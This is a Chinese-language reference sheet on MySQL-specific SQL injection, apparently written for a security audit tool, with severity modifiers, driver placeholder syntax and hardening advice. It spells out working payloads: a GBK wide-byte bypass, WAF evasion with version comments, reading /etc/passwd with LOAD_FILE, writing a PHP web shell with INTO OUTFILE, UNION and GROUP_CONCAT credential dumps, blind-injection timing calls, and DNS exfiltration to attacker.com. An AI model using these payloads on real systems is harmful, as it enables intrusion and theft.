# MySQL — 引擎特异性知识

---

## 1. 注入特有技法

### 1.1 反斜杠转义差异

```sql
-- MySQL 默认将 \ 作为转义字符（与 SQL 标准不同）
SELECT * FROM users WHERE name = 'O\'Reilly';  -- MySQL OK
-- addslashes() 可被 GBK 等多字节编码绕过
-- 0xbf27 在 GBK 中是合法多字节字符，可"吃掉" \
```

### 1.2 版本注释 `/*!*/`

```sql
-- MySQL 特有：版本条件注释（可绕过 WAF）
SELECT /*!50000 1,2,3,4,5 */;
-- 仅在 MySQL >= 5.00.00 时执行注释内容
-- 常用于绕过检测 SELECT 关键字的 WAF
```

### 1.3 `LOAD_FILE` / `INTO OUTFILE` 文件操作

```sql
-- 读取服务器文件
SELECT LOAD_FILE('/etc/passwd');

-- 写入文件（WebShell）
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- 写入文件（数据导出）
SELECT * FROM users INTO OUTFILE '/tmp/users.csv';
-- 需要 FILE 权限 + secure_file_priv 未限制
```

### 1.4 `INFORMATION_SCHEMA` 元数据

```sql
-- 枚举数据库结构
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
-- 几乎总是可用
```

### 1.5 UNION 注入

```sql
-- MySQL UNION 注入最为常见
-- 确定列数
' ORDER BY 1-- +
' ORDER BY 2-- +
-- ...
' UNION SELECT 1,2,3,4,5-- +
-- 列类型兼容性宽松
```

### 1.6 十六进制编码绕过

```sql
-- MySQL 支持 0x 十六进制字面量
SELECT * FROM users WHERE name = 0x61646D696E;  -- 'admin'
-- 可绕过引号过滤
```

### 1.7 `GROUP_CONCAT` 数据聚合

```sql
-- 在 UNION 注入中一次提取多行
SELECT GROUP_CONCAT(username, 0x3a, password SEPARATOR 0x0a) FROM users;
```

---

## 2. 严重性修正因子

| 条件 | 修正 | 原因 |
|------|------|------|
| 应用使用 `root` / `FILE` 权限用户 | ↑ 上调至 🔴 高危 | LOAD_FILE / INTO OUTFILE 可用 |
| `secure_file_priv` 为空或未设置 | ↑ 上调一级 | 文件操作无限制 |
| MySQL < 5.7（无 `sql_mode=NO_BACKSLASH_ESCAPES`） | ↑ 上调一级 | 反斜杠转义可被绕过 |
| 使用多字节编码（GBK, Big5, SJIS） | ↑ 上调一级 | 宽字节注入风险 |
| `SUPER` 权限 | ↑ 上调一级 | 可修改全局变量 |
| 应用使用最低权限只读用户 | ↓ 下调一级 | 无法写文件或修改数据 |
| 启用 `sql_mode=NO_BACKSLASH_ESCAPES` | 不变 | 减少转义绕过但不消除注入 |

---

## 3. 占位符语法

| 驱动 | 占位符 | 示例 |
|------|--------|------|
| mysql2 (Node.js) | `?` | `WHERE id = ?` |
| PyMySQL / mysqlclient | `%s` | `WHERE id = %s` |
| go-sql-driver/mysql | `?` | `WHERE id = ?` |
| MySQL Connector/J (Java) | `?` | `WHERE id = ?` |
| MySqlConnector (.NET) | `@name` | `WHERE id = @id` |
| PDO (PHP) | `?` 或 `:name` | `WHERE id = ?` 或 `:id` |

---

## 4. 数据外带方法

| 方法 | 条件 | 示例 |
|------|------|------|
| UNION 查询 | 默认可用 | `UNION SELECT version()` |
| 错误信息 | 取决于配置 | `extractvalue(1, concat(0x7e, version()))` |
| `LOAD_FILE` | FILE 权限 | `SELECT LOAD_FILE('/etc/passwd')` |
| `INTO OUTFILE` | FILE 权限 + secure_file_priv | 写入 Web 目录 |
| DNS 外带 | Windows + FILE 权限 | `LOAD_FILE('\\\\attacker.com\\share')` |
| 时间盲注 | 默认可用 | `SLEEP(5)` / `BENCHMARK(10000000, SHA1('a'))` |
| 布尔盲注 | 默认可用 | 条件差异 |

---

## 5. 防御建议

1. 使用最低权限用户，不授予 `FILE` / `SUPER` / `PROCESS` 权限
2. 设置 `secure_file_priv` 为空目录或 NULL
3. 使用 `utf8mb4` 编码（避免宽字节问题）
4. 启用 `sql_mode=NO_BACKSLASH_ESCAPES`
5. 生产环境关闭错误信息显示（`display_errors = Off`）
